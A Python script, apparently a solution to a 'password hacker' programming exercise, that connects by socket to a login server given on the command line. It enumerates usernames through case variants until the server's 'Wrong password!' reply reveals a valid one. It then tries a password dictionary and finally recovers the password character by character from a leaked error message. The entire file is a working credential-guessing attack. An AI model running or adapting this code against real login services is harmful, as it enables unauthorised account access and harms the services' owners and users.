import socket
import itertools
import json
import string
from sys import argv, exit
from datetime import datetime

passwords = []
logins = []
all_chars = []
right_login = ""
right_password = ""
success = 0

def open_files():
    with open("passwords.txt") as pass_file:
        passwords.extend(pass_file.readlines())

    with open("logins.txt") as login_file:
        logins.extend(login_file.readlines())


def jsonify(login, password):
    login_dict = {
        "login": login,
        "password": password
    }
    login_json = json.dumps(login_dict)
    return login_json


def generate_all_chars():
    chars = []
    digits = [str(i) for i in range(0, 10)]
    lower_alphabelts = list(string.ascii_lowercase)
    upper_alphabelts = list(string.ascii_uppercase)
    chars.extend(upper_alphabelts)
    chars.extend(lower_alphabelts)
    chars.extend(digits)
    return chars

def try_logins(sock):
    global right_login

    for login in logins:
        login = login.strip()
        login_iter = map(''.join, itertools.product(*zip(login.upper(), login.lower())))
        for itr in login_iter:
            login = "".join(list(itr))
            password = " "
            json_obj = jsonify(login, password)
            sock.sendall(json_obj.encode('utf-8'))
            data = sock.recv(1024)
            data = data.decode()
            if json.loads(data).get("result") == "Wrong password!":
                right_login += login
                return 1
    return 0


def try_database_passwords(sock, login):
    global right_password

    for password in passwords:
        password = password.strip()
        pass_iter = map(''.join, itertools.product(*zip(password.upper(), password.lower())))
        for itr in pass_iter:
            login = login
            password = "".join(list(itr))
            json_obj = jsonify(login, password)
            sock.sendall(json_obj.encode('utf-8'))
            data = sock.recv(1024)
            data = data.decode()
            if json.loads(data).get("result") == "Success!":
                right_password += password
                return 1
    return 0


def try_possible_passwords(sock, login):
    global right_password
    global all_chars

    all_chars.extend(generate_all_chars())
    password = ""
    found = 0
    while not found:
        for ch in all_chars:
            json_obj = jsonify(login, password + ch)
            start = datetime.now()
            sock.sendall(json_obj.encode('utf-8'))
            data = sock.recv(1024)
            data = data.decode()
            if json.loads(data).get("result") == "Exception happened during login!":
                password += ch
                break
            elif json.loads(data).get("result") == "Success!":
                right_password += password
                return 1
    return 0


def client():
    global success

    open_files()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        host = argv[1]
        port = int(argv[2])
        try:
            sock.connect((host, port))
            if try_logins(sock):
                success = try_database_passwords(sock, right_login)
            if right_login and not success:
                success = try_possible_passwords(sock, right_login)
        except Exception as e:
            print(f"An error {e} occurred")
            exit()


client()
if success:
    print(f"Success\n{jsonify(right_login, right_password)}")
else:
    print("The correct login was not found!")
